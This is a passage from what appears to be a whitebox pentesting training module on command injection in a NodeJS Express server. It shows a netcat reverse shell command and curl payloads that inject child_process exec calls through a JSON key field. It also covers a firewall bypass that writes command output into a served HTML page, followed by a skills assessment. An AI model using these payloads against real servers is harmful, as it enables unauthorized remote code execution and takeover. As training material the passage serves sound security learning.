Next, we will pick a reverse shell command to execute. There are many commands we can try. We can find a full list in the following link: [Reverse Shells - PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

We can even pick a NodeJS reverse shell, and inject it into `eval`, without having to use `child_process` to execute system commands. However, it is much easier to simply use a reverse shell command. We will pick the first in the above link, which is the following reverse shell command:

```shell
nc -e /bin/bash 127.0.0.1 1234

```

We can now send it using our `curl` command, as follows:

```shell
curl http://127.0.0.1:21440/admin -X POST -d '{"key":"\"); const { exec } = require(\"child_process\"); exec(\"nc -e /bin/bash 127.0.0.1 1234\"); //"}'

```

We go back to our `netcat` listener, and see that we indeed got a connection back, and can execute any commands we want:

```shell
nc -lvnp 1234

listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 41126
ls

admin.html
denied.html
pwned
server.js
validateKey.js

```

We have finally gained control over the `NodeJS` server, and now have a full interactive reverse shell on it.

* * *

## Remote Code Execution

Now that we have tested everything, and prepared a command that would give us a shell on the `server.js` NodeJS script, all that is left is to try it on the remote server. In normal cases, we would be able to use the same Reverse Shell command from above. Simply swap out `http://127.0.0.1:21440/` with the `http://SERVER_IP:PORT/`, and swap `127.0.0.1 1234` with our external IP `10.X.X.X 1234`, and then send the command, and we would receive a reverse shell on our system.

However, in this case, we still have one more trick to learn, because in our exercise, you will not be able to open any additional ports, `since it is behind a strict firewall`. So, we will instead execute a command, and direct its output into a file we can read (i.e. ` > ./denied.html`), since we know it is in the same directory from the source code. This will enable us to execute commands and get their outputs, even behind a firewall.

Tip: To avoid noise, it would be wise you create a backup copy of \`denied.html\`, and then restore it to its original state once we are done.

We can now send our command using our `curl` command, as follows:

```shell
curl http://SERVER_IP:PORT/admin -X POST -d '{"key":"\"); const { exec } = require(\"child_process\"); exec(\"ls -la > ./denied.html\"); //"}'

```

Now we can simply curl this page in order to get the output (by default we should get `denied.html` in `/admin`):

```shell
curl -s http://SERVER_IP:PORT/admin

total 40
drwxr-xr-x 1 user user  4096 XXX xx xx:xx .
drwxr-xr-x 1 root     root      4096 XXX xx xx:xx ..
-rw-r--r-- 1 user user  1026 XXX xx xx:xx admin.html
-rw-r--r-- 1 user user     0 XXX xx xx:xx denied.html
-rw-r--r-- 1 user user 10918 XXX xx xx:xx index.html
-rw-r--r-- 1 user user  1656 XXX xx xx:xx server.js
-rw-r--r-- 1 user user  2293 XXX xx xx:xx validateKey.js

```

Great! We now have a way to execute commands and get their output, hence gaining full control over a remote server.


# Skills Assessment

* * *

A company is developing a web tool using the NodeJS Express framework. You are assigned to review part of the web server being developed, and run a Whitebox Pentest on it.

Run the server in the question below, and access `http://SERVER_IP:PORT/source.zip` to download a copy of the web server.

Once you unzip `source.zip`, you should be able to run the webserver locally on your Pwnbox with `node server.js`.

Try to apply what you learned on this module and do a code review on `server.js` to be able to identify potential vulnerabilities. Then, try to verify any potential vulnerabilities using the local debugging and exploitation steps discussed in this module.


# Summary

* * *

Congratulations on reaching the end of the `Whitebox Pentesting 101: Command Injection` module. We hope you are now able to identify command injection vulnerabilities in source code, utilize local debugging to create your final payload, and exploit the vulnerability to get total control over the remote system.

The following is a summary of what we learned:

- `Reviewing source code` to understand its main functionality

- `Identifying Code and Command Injection` vulnerabilities

- `Intro to Injections` and Command Injections

- `Crafting payloads` to exploit Command Injection vulnerabilities

- `Utilizing local debugging` to test and verify command injection

- `Blindly verifying` successful exploitation of the command injections vulnerability

- `Exploiting command injections` vulnerabilities to execute system commands


Try to repeat all of what you learned, and do all of the examples and exercise to be more capable in JavaScript Secure Coding.

* * *

## The Way Ahead

As we finish covering Command Injection vulnerability, we look towards other common and critical vulnerabilities, like `Local/Remote File Inclusion`, `Type Manipulation`, `Memory Corruption`, `SQL Injection`, and many other types of vulnerabilities. We will discuss how to identify and exploit such vulnerabilities, and many others, in other `Whitebox Pentesting` modules, so be sure to check them out.


